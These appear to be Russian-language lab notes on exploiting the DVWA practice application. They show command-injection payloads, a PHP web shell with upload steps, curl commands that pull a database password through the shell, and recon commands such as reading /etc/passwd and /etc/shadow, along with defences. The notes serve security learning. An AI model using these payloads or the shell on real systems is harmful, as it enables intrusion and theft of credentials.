## ⚡ Command Injection

### Что это
Уязвимость при которой пользовательский ввод передаётся **напрямую в системную команду** без фильтрации.

```
Нормально:  ping 127.0.0.1             → сервер пингует адрес
Атака:      127.0.0.1; whoami          → сервер выполняет whoami!
Атака:      127.0.0.1 && cat /etc/passwd → читает системный файл!
```

### OWASP категория
**A03 — Injection**

### Операторы для инъекции (Linux)

| Оператор | Пример | Поведение |
|---|---|---|
| `;` | `127.0.0.1; whoami` | Выполняет обе команды всегда |
| `&&` | `127.0.0.1 && whoami` | Выполняет вторую только если первая успешна |
| `\|\|` | `bad_ip \|\| whoami` | Выполняет вторую только если первая провалилась |
| `\|` | `127.0.0.1 \| whoami` | Передаёт вывод первой в следующую команду |

### Практика на DVWA — результаты

| Payload | Результат | Что узнали |
|---|---|---|
| `127.0.0.1` | ping статистика | Базовый функционал |
| `127.0.0.1; whoami` | `www-data` | Пользователь сервера |
| `127.0.0.1; cat /etc/passwd` | все пользователи | Список юзеров системы |
| `127.0.0.1; uname -a` | `Linux kali 6.19.11+kali-amd64` | ОС и версия ядра |
| `127.0.0.1; ifconfig` | `eth0: 10.0.2.15` `docker0: 172.17.0.1` | IP адреса сети |

### Что узнали через одну форму
```
✅ Пользователь сервера:  www-data
✅ Список пользователей:  /etc/passwd
✅ Версия ОС и ядра:      Linux Kali 6.19.11
✅ IP адреса сервера:     10.0.2.15, 172.17.0.1
✅ Docker установлен:     да (docker0 интерфейс)
```

### Защита от Command Injection
```
✅ Никогда не передавать пользовательский ввод в system()/exec()
✅ Использовать whitelist — разрешать только цифры и точки для IP
✅ Экранировать специальные символы: ; & | ` $
✅ Использовать параметризованные вызовы
```

## 📁 File Upload — Загрузка веб-шелла

### Что такое веб-шелл
PHP файл который принимает команды через HTTP и выполняет их на сервере.

```php
<?php system($_GET['cmd']); ?>
```

### Как работает
```
Браузер → shell.php?cmd=whoami → PHP → system("whoami") → ОС → www-data
```

`system()` — PHP функция которая передаёт строку напрямую в операционную систему.
`$_GET['cmd']` — берёт значение параметра `cmd` из URL.

### OWASP категория
**A04 — Insecure Design / A05 — Security Misconfiguration**

### Практика — шаги атаки

```bash
# Шаг 1 — создать веб-шелл
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Шаг 2 — дать права на папку uploads (если нужно)
sudo chmod 777 /var/www/html/dvwa/hackable/uploads/

# Шаг 3 — установить PHP модуль GD (если нужно)
sudo apt install php-gd -y && sudo service apache2 restart

# Шаг 4 — загрузить через браузер
# File Upload → Browse → /tmp/shell.php → Upload

# Шаг 5 — активировать шелл
http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami
```

### Результаты веб-шелла

| URL команда | Результат |
|---|---|
| `?cmd=whoami` | `www-data` |
| `?cmd=uname+-a` | версия ОС |
| `?cmd=ls+/var/www/html/dvwa` | структура сервера |
| `?cmd=cat+config.inc.php+\|+base64` | содержимое конфига |

### Критическая находка — пароль БД!
```bash
# Получить конфиг через шелл и декодировать:
curl 'http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=cat+/var/www/html/dvwa/config/config.inc.php+|+base64' | base64 -d

# Результат:
db_server:   127.0.0.1
db_user:     dvwa
db_password: p@ssw0rd   ← ПАРОЛЬ ПОЛУЧЕН!
db_database: dvwa
```

### Почему пустая страница при шелле?
PHP интерпретатор **выполняет** файл как код. Если команда не вернула вывод — страница пустая.
**Решение:** добавить `| base64` или использовать `view-source:` в браузере.

### Защита от File Upload атак
```
✅ Проверять расширение — разрешать только .jpg .png .gif
✅ Проверять MIME тип файла — не только расширение
✅ Переименовывать файл — случайное имя без .php
✅ Хранить вне webroot — файлы не должны быть доступны через браузер
✅ Отключить выполнение PHP в папке uploads
```

## 📋 Полезные команды для разведки через шелл

```bash
whoami                    # кто я
uname -a                  # версия ОС
ifconfig / ip a           # сетевые интерфейсы
cat /etc/passwd           # пользователи системы
cat /etc/shadow           # хэши паролей (нужен root)
ls /var/www/html          # структура веб-сервера
find / -name "*.conf"     # поиск конфигов
ps aux                    # запущенные процессы
netstat -tulnp            # открытые порты
```

## ⚠️ Важные заметки

```
# Пробелы в URL заменяются на +
?cmd=uname -a   →   ?cmd=uname+-a

# Если страница пустая — используй base64
?cmd=cat+file.php+|+base64

# Декодировать base64 в терминале:
echo "base64string" | base64 -d

# Одинарные кавычки в curl для URL со спецсимволами:
curl 'http://target/shell.php?cmd=cat+file|+base64' | base64 -d
```
